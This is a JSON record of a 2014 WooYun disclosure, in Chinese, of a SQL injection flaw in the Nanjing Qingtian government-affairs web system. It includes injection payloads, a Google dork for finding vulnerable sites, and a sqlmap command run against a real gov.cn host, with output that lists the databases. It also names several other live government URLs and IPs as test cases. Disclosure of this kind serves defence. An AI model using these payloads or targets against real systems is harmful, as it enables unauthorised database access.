{"id": 51240, "wybug_id": "wooyun-2014-075253", "wybug_title": "南京擎天政务系统通用SQL注入漏洞", "wybug_corp": "南京擎天政务系统", "wybug_author": "路人甲", "wybug_date": "2014-09-09 14:52", "wybug_open_date": "2014-12-08 14:54", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-17：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-08：\t细节向公众公开  简要描述： 南京擎天政务系统存在通用SQL注入漏洞，可获取数据库任意数据 详细说明：  漏洞链接: /index_page/geren_list_page.aspx漏洞参数: serverPayload:  server=-1' or 'a'='agoogle搜索 inurl:geren_list_page.aspx\n\n以http://qlgk.taixing.gov.cn/index_page/geren_list_page.aspx?server=1&refid= 作为测试案例\n\nSQL报错测试：http://qlgk.taixing.gov.cn/index_page/geren_list_page.aspx?server=1'&refid=\n\n   漏洞证明：  使用Sqlmap自动化测试：$ py sqlmap.py -u 'http://qlgk.taixing.gov.cn/index_page/geren_list_page.aspx?server=1&refid=' -p server --level 5 --risk 3  --random-agent --dbs -v 0    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibilit[*] starting at 23:44:32sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: server    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: server=1' AND 7868=7868 AND 'jaJT'='jaJT&refid=    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: server=1' AND 1632=CONVERT(INT,(SELECT CHAR(113)+CHAR(111)+CHAR(118)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (1632=1632) TH    Type: UNION query    Title: Generic UNION query (NULL) - 3 columns    Payload: server=1' UNION ALL SELECT NULL,CHAR(113)+CHAR(111)+CHAR(118)+CHAR(118)+CHAR(113)+CHAR(79)+CHAR(67)+CHAR(87)+CHAR(84)+CHAR    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: server=-7957' OR 2182=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers A---web server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008available databases [7]:[*] master[*] model[*] msdb[*] tempdb[*] txgkptweb[*] txweb[*] tzmszj\n\n其他测试案例：http://58.222.216.220/ggweb/index_page/geren_list_page.aspx?server=2&refid= http://qlgk.taixing.gov.cn/index_page/geren_list_page.aspx?server=1&refid= http://qlgk.taizhou.gov.cn/tzptweb/index_page/geren_list_page.aspx?server=1&refid= http://58.222.195.110:8081/jyweb/index_page/geren_list_page.aspx?server=1&refid= http://58.222.211.21/xhweb/index_page/geren_list_page.aspx?server=1&refid=   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2014-09-14 09:52 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}